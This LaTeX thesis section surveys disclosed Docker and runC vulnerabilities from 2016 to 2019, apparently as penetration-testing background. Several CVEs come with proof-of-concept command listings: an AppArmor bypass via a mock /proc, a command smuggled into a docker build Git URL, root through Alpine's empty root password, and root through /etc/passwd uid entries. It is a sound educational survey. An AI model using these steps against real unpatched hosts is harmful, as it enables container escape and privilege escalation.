\section{Security Related Software Bugs}\label{section:bugs}
In this section we will look at security related bugs that have been found in the last few years. Although there have been many security related bugs found in the Docker ecosystem, not all of them have a large impact. Others are not fully publicly disclosed. We will look (from most recent to least recent) at recent, fully disclosed bugs that might be of use during a penetration test. In the \hyperref[appendix:CVE-List]{appendix} you will find a list of other less interesting Docker related bugs that were researched during this thesis.

Each bug is not immediately a complete container escape or other attack scenario. Most are useful during during an attack when used in combination with other vulnerabilities. For example by bypassing a protection mechanism.
However, some severe bugs are even dangerous when used by themselves. For example, CVE--2019--16884 (see \autoref{subsection:CVE-2019-16884}) is a container escape.

\subsection{CVE--2019--16884}
Because of a bug in runC (1.0.0-rc8 and older versions) it was possible to mount \lstinline{/proc} in a container. Because the active AppArmor profile is defined in \lstinline{/proc/self/attr/apparmor/current}, this vulnerability allows a container to completely bypass AppArmor.

\hfill

A proof of concept has been provided at\cite{CVE-2019-16884-Github}. We see that if we create a very simple mock \lstinline{/proc}, the Docker starts without the specified AppArmor profile.
\begin{lstlisting}[caption={Bypass AppArmor by mounting \lstinline{/proc}.},captionpos=b]
(host)$ mkdir -p rootfs/proc/self/{attr,fd}
(host)$ touch rootfs/proc/self/{status,attr/exec}
(host)$ touch rootfs/proc/self/fd/{4,5}
(host)$ cat Dockerfile
FROM busybox
ADD rootfs /

VOLUME /proc
(host)$ docker build -t apparmor-bypass .
(host)$ docker run --rm -it --security-opt "apparmor=docker-default"  apparmor-bypass
# container runs unconfined
\end{lstlisting}

\subsection{CVE--2019--13139}\label{CVE-2019-13139}
Older versions than Docker 18.09.4, had a bug were \lstinline{docker build} incorrectly parsed URLs, which allows code execution~\cite{CVE-2019-13139-STAALDRAAD}. The string supplied to \lstinline{docker build} is split on ``:'' and ``\#'' to parse the Git reference. By supplying a malicious URL, it is possible to achieve code execution.

\medskip

For example, in the following \lstinline{docker build} command, the command ``\lstinline{echo attack}'' is executed.

\begin{lstlisting}[caption={\lstinline{docker build} command execution.},captionpos=b]
(host)$ docker build "git@github.com/meh/meh#--upload-pack=echo attack;#:"
\end{lstlisting}

\lstinline{docker build} executes \lstinline{git fetch} in the background. But with the malicious command \lstinline{git fetch --upload-pack=echo attack; git@github.com/meh/meh} is executed, which in turn executes \lstinline{echo attack}.

\subsection{CVE--2019--5736}\label{CVE-2019-5736}
A serious vulnerability was discovered in runC that allows containers to overwrite the runC binary on the host. Docker before version 18.09.2 is vulnerable. Whenever a Docker container is created or when \lstinline{docker exec} is used, a runC process is run. This runC process bootstraps the container. It creates all the necessary restrictions and then executes the process that needs to run in the container. The researches found that it is possible to make runC execute itself in the container, by telling the container to start \lstinline{/proc/self/exe} which during the bootstrap is symlinked to the runC binary~\cite{CVE-2019-5736-DragonSector}~\cite{CVE-2019-5736-Github}. \lstinline{/proc/self/exe} in the container will point to the runC binary on the host. The \lstinline{root} user in the container is then able to replace the runC host binary using that reference. The next time runC is executed (i.e.\ when a container is created or \lstinline{docker exec} is run), the overwritten binary is run instead. This, of course, is dangerous because it allows a malicious container to execute code on the host.

\subsection{CVE--2019--5021}\label{subsection:CVE-2019-5021}
The Docker image for Alpine Linux (one of the most used base images) had a problem where the password of the \lstinline{root} user in the container is left empty. In Linux it is possible to disable a password and to leave it blank. A disabled password cannot be used, but a blank password equals an empty string. This allows non-\lstinline{root} users to gain \lstinline{root} rights by supplying an empty string.

\hfill

It is still possible to use the vulnerable images (\lstinline{alpine:3.3}, \lstinline{alpine:3.4} and \lstinline{alpine:3.5}).
\begin{lstlisting}[caption={The Docker image of Alpine Linux 3.5 has an empty password.},captionpos=b]
(host)$ docker run -it --rm alpine:3.5 cat /etc/shadow
root:::0:::::
...
(host)$ docker run -it --rm alpine:3.5 sh
(cont)# apk add --no-cache linux-pam shadow
...
(cont)# adduser test
...
(cont)# su test
Password:
(cont)$ su root
(cont)#
\end{lstlisting}

\subsubsection*{Side note about the CVSS score of CVE--2019--5021}

This vulnerability has a CVSS score of 9.8 (and a 10 in CVSS 2)\footnote{\url{https://nvd.nist.gov/vuln/detail/CVE-2019-5021}} out of a maximum score of 10. Such a high CVSS score means that this is considered an extremely high-risk vulnerability. But in actuality, this vulnerability is only risky in very specific cases.

An empty \lstinline{root} password sounds very dangerous, but it really is not that dangerous in an isolated environment (e.g.\ a container) that runs as \lstinline{root} (inside the container) by default. This vulnerability will only be dangerous in very specific cases.

For example, if we create a Docker image based on \lstinline{alpine:3.5} that uses a non-\lstinline{root} user by default. If an attacker finds a way to execute code in the container, this vulnerability will allow them to escalate their privileges from the non-\lstinline{root} user to \lstinline{root}, but the attacker will still need to find a way to escape the container. Being able to execute code as \lstinline{root} will help them with escaping the container, but it does not guarantee it. This example shows that this vulnerability is dangerous, but only in a scenario where it is chained using other vulnerabilities.

\subsection{CVE--2018--15664}
A bug was found in Docker 18.06.1-ce-rc1 that allows processes in containers to read and write files on the host\cite{CVE-2018-15664-Openwall}\cite{CVE-2018-15664-Bugzilla}. There is enough time between the checking if a symlink is linked to a safe path (within the container) and the actual using of the symlink, that the symlink can be pointed to another file in the mean time. This allows a container to start by reading or writing a symlink to a arbitrary non-relevant file in the container, but actually read or write a file on the host.

\subsection{CVE--2018--9862}
Docker did try to interpret values passed to the \lstinline{--user} argument as a username before trying them as a user id\cite{CVE-2018-9862-Github}. This can be misused using the first entry of \lstinline{/etc/passwd}. This allows malicious images be created with users that grant \lstinline{root} rights when used.

\begin{lstlisting}[caption={Overwrite the \lstinline{root} user in a container.},captionpos=b]
(host)$ docker run --rm -ti ... ubuntu bash
(cont)# echo "10:x:0:0:root:/root:/bin/bash" > /etc/passwd
(host)$ docker exec -ti -u 10 hello  bash
(cont)# id
uid=0(10) gid=0(root) groups=0(root)
\end{lstlisting}

\subsection{CVE--2016--3697}

Docker before 1.11.2 did try to interpret values passed to the \lstinline{--user} argument as a username before trying them as a user id\cite{CVE-2016-3697-Github}. This allows malicious images be created with users that grant \lstinline{root} rights when used.
\begin{lstlisting}[caption={Override \lstinline{root} user in container.},captionpos=b]
(host)$ docker run --rm -it --name=test ubuntu:latest /bin/bash
(cont)# echo '31337:x:0:0:root:/root:/bin/bash' >> /etc/passwd
(host)$ sudo docker exec -it --user 31337 test /bin/bash
(cont)# id
uid=0(root) gid=0(root) groups=0(root)
\end{lstlisting}

